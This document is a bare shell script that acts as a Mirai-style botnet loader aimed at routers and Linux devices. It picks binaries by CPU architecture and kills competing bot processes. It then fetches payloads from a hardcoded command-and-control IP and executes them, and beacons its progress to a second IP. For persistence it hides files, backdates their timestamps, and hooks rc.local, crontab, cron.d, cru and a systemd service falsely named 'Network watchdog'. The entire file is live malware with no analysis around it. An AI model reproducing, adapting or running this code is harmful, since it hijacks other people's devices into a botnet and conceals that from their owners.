#!/bin/sh
CNC="213.193.244.46"
BEACON="http://91.92.40.4"
MACH="$(uname -m 2>/dev/null | tr 'A-Z' 'a-z')"
CAND=""
case "$MACH" in
    x86_64|amd64)                                      CAND="px86_64 px86 pmips pmpsl parm7 parm6 parm5 parm pppc pm68k psh4" ;;
    i386|i486|i586|i686|x86)                           CAND="px86 pmips pmpsl parm7 parm6 parm5 parm pppc pm68k psh4" ;;
    mipsel*|mipsle*|mipsr2el)                          CAND="pmpsl pmips parm7 parm6 parm5 parm px86 pppc pm68k psh4" ;;
    mips*)                                             CAND="pmips pmpsl parm7 parm6 parm5 parm px86 pppc pm68k psh4" ;;
    armv8*|aarch64|arm64)                              CAND="parm7 parm6 parm5 parm px86 pmips pmpsl pppc pm68k psh4" ;;
    armv7*|armv6*|armv6l|armv7l|armv5*|armv5te*|arm)   CAND="parm7 parm6 parm5 parm px86 pmips pmpsl pppc pm68k psh4" ;;
    arm*)                                              CAND="parm parm5 parm6 parm7 px86 pmips pmpsl pppc pm68k psh4" ;;
    ppc|powerpc|ppc64)                                 CAND="pppc pmips pmpsl parm7 parm6 parm5 parm px86 pm68k psh4" ;;
    m68k)                                              CAND="pm68k pmips pmpsl parm7 parm6 parm5 parm px86 pppc psh4" ;;
    sh4|sh)                                            CAND="psh4 pmips pmpsl parm7 parm6 parm5 parm px86 pppc pm68k" ;;
esac
[ -z "$CAND" ] && CAND="parm7 parm6 parm5 parm pmips pmpsl px86 pppc pm68k psh4"

running_pid() {
    for p in /proc/[0-9]*; do
        [ -r "$p/comm" ] || continue
        c=$(cat "$p/comm" 2>/dev/null)
        case "$c" in
            scanbot|robben)
                pid=${p#/proc/}
                [ "$pid" = "$$" ] && continue
                echo "$pid"
                return 0
                ;;
        esac
    done
    return 1
}

install_watchdog() {
    BIN="$1"
    PDIR=""
    for D in /jffs /etc /usr /mnt /root /opt /var/lib; do
        [ -d "$D" ] || continue
        if cp -p "$BIN" "$D/.robben" 2>/dev/null || cp "$BIN" "$D/.robben" 2>/dev/null; then
            chmod 755 "$D/.robben" 2>/dev/null
            touch -t 202001010000 "$D/.robben" 2>/dev/null
            PDIR="$D"
            break
        fi
    done
    [ -z "$PDIR" ] && return 1
    WD="$PDIR/.robben.sh"
    {
        printf '#!/bin/sh\n'
        printf 'for p in /proc/[0-9]*; do\n'
        printf '  [ -r "$p/comm" ] || continue\n'
        printf '  [ "$(cat "$p/comm" 2>/dev/null)" = "scanbot" ] && exit 0\n'
        printf 'done\n'
        printf 'BIN=""\n'
        printf 'for f in /jffs/.robben /etc/.robben /usr/.robben /mnt/.robben /root/.robben /opt/.robben /var/lib/.robben; do\n'
        printf '  [ -s "$f" ] && BIN="$f" && break\n'
        printf 'done\n'
        printf '[ -z "$BIN" ] && exit 0\n'
        printf '"$BIN" 213.193.244.46 >/dev/null 2>&1 &\n'
    } > "$WD" 2>/dev/null
    chmod 755 "$WD" 2>/dev/null
    touch -t 202001010000 "$WD" 2>/dev/null
    for f in /jffs/scripts/init-start /jffs/scripts/services-start /jffs/scripts/post-mount /etc/rc.local /etc/rc.d/rc.local /etc/init.d/rcS /etc/rc.d/rcS; do
        case "$f" in
            /jffs/scripts/*) mkdir -p /jffs/scripts 2>/dev/null; [ -f "$f" ] || printf '#!/bin/sh\n' > "$f" 2>/dev/null ;;
        esac
        [ -f "$f" ] || continue
        grep -q '.robben.sh' "$f" 2>/dev/null || printf '%s >/dev/null 2>&1 &\n' "$WD" >> "$f" 2>/dev/null
        chmod +x "$f" 2>/dev/null
        touch -t 202001010000 "$f" 2>/dev/null
    done
    for C in /usr/sbin/crond /sbin/crond /usr/bin/crond /bin/crond /usr/sbin/cron /usr/bin/cron; do
        [ -x "$C" ] || continue
        (crontab -l 2>/dev/null | grep -v '.robben.sh'; printf '*/3 * * * * %s >/dev/null 2>&1\n' "$WD") | crontab - 2>/dev/null
        for cf in /var/spool/cron/crontabs/* /var/spool/cron/*; do
            [ -f "$cf" ] && touch -t 202001010000 "$cf" 2>/dev/null
        done
        break
    done
    CRU=""
    for C in /usr/sbin/cru /sbin/cru /usr/bin/cru /bin/cru; do
        [ -x "$C" ] && CRU="$C" && break
    done
    if [ -n "$CRU" ]; then
        $CRU a robben "*/3 * * * * $WD >/dev/null 2>&1" 2>/dev/null
        for f in /jffs/scripts/services-start /jffs/scripts/init-start; do
            [ -f "$f" ] || continue
            grep -q 'cru a robben' "$f" 2>/dev/null || printf '%s a robben "*/3 * * * * %s >/dev/null 2>&1"\n' "$CRU" "$WD" >> "$f" 2>/dev/null
            touch -t 202001010000 "$f" 2>/dev/null
        done
    fi
    if [ -d /etc/cron.d ]; then
        printf '*/3 * * * * root %s >/dev/null 2>&1\n' "$WD" > /etc/cron.d/.robben 2>/dev/null
        chmod 644 /etc/cron.d/.robben 2>/dev/null
        touch -t 202001010000 /etc/cron.d/.robben 2>/dev/null
    fi
    if [ -f /etc/crontab ]; then
        grep -q '.robben.sh' /etc/crontab 2>/dev/null || printf '*/3 * * * * root %s >/dev/null 2>&1\n' "$WD" >> /etc/crontab 2>/dev/null
        touch -t 202001010000 /etc/crontab 2>/dev/null
    fi
    if [ -d /etc/systemd/system ] && command -v systemctl >/dev/null 2>&1; then
        {
            printf '[Unit]\nDescription=Network watchdog\n'
            printf '[Service]\nExecStart=/bin/sh %s\nRestart=always\nRestartSec=60\n' "$WD"
            printf '[Install]\nWantedBy=multi-user.target\n'
        } > /etc/systemd/system/network-watchdog.service 2>/dev/null
        touch -t 202001010000 /etc/systemd/system/network-watchdog.service 2>/dev/null
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable --now network-watchdog.service >/dev/null 2>&1
    fi
    return 0
}

beacon() {
    (wget -qO- "$BEACON/beacon?stage=$1&m=$MACH&a=$2&d=$3" >/dev/null 2>&1 || curl -s "$BEACON/beacon?stage=$1&m=$MACH&a=$2&d=$3" >/dev/null 2>&1) &
}

dl() {
    (wget -q -O "$2" "http://213.193.244.46/bins/$1" 2>/dev/null || curl -s -o "$2" "http://213.193.244.46/bins/$1" 2>/dev/null || busybox wget -q -O "$2" "http://213.193.244.46/bins/$1" 2>/dev/null || busybox curl -s -o "$2" "http://213.193.244.46/bins/$1" 2>/dev/null) 2>/dev/null
}

cp /bin/busybox /tmp/ 2>/dev/null || cp /bin/busybox /var/tmp/ 2>/dev/null || cp /bin/busybox /run/ 2>/dev/null || cp /bin/busybox /dev/shm/ 2>/dev/null || true
killall -9 mips 2>/dev/null; killall -9 mips.s 2>/dev/null
killall -9 mpsl 2>/dev/null; killall -9 mpsl.s 2>/dev/null
killall -9 x86_64 2>/dev/null; killall -9 x86_64.s 2>/dev/null
killall -9 arm4 2>/dev/null; killall -9 arm4.s 2>/dev/null
killall -9 arm5 2>/dev/null; killall -9 arm5.s 2>/dev/null
killall -9 arm6 2>/dev/null; killall -9 arm6.s 2>/dev/null
killall -9 arm7 2>/dev/null; killall -9 arm7.s 2>/dev/null
killall -9 ppc 2>/dev/null; killall -9 ppc.s 2>/dev/null
killall -9 m68k 2>/dev/null; killall -9 m68k.s 2>/dev/null
killall -9 sh4 2>/dev/null; killall -9 sh4.s 2>/dev/null
killall -9 robben 2>/dev/null; killall -9 sora 2>/dev/null; killall -9 hajime 2>/dev/null

beacon start "" ""

PID="$(running_pid)"
if [ -n "$PID" ]; then
    if install_watchdog "/proc/$PID/exe"; then
        beacon persist "$MACH" "$PDIR"
    else
        beacon persist "$MACH" "noexe"
    fi
    exit 0
fi

for DIR in /tmp /var/tmp /dev/shm /run /mnt /root /opt /var /home; do
    cd "$DIR" 2>/dev/null || continue
    for ARCH in $CAND; do
        rm -f robben 2>/dev/null
        dl "$ARCH" robben
        [ -s robben ] || continue
        chmod 755 robben 2>/dev/null
        cp robben /tmp/.keep 2>/dev/null
        touch -t 202001010000 /tmp/.keep 2>/dev/null
        ./robben $CNC
        rc=$?
        if [ $rc -eq 0 ]; then
            install_watchdog /tmp/.keep
            rm -f /tmp/.keep 2>/dev/null
            beacon run "$ARCH" "$DIR"
            exit 0
        fi
        rm -f robben /tmp/.keep 2>/dev/null
    done
done

beacon fail "" ""
exit 0
